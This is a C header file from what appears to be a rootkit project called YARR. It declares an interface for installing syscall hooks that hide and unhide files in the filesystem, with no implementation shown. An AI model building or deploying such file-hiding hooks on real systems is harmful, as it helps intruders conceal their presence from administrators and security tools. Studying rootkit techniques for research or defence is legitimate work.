#ifndef __YARR_HIDEFILE
#define __YARR_HIDEFILE

/**
 * Initializes hidefile subsystem.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hidefile_init(void);

/**
 * Stops using hidefile subsystem.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hidefile_finish(void);

/**
 * Installs in the system the syscall hooks this module implements.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hidefile_install_hooks(void);

/**
 * Hides a file in the filesystem.
 *
 * @fname: The filename of the while to hide.
 * @return: Zero on success, non-zero elsewhere.
 */
int hide_file(const char *fname);

/**
 * Stops hiding a file previously hidden with hide_file.
 *
 * @fname: The filename of the file to stop hidding.
 * @return: Zero on success, non-zero elsewhere.
 */
int unhide_file(const char *fname);

/**
 * Stops hiding all the files previously hidden with hide_file.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int unhide_file_all(void);

#endif
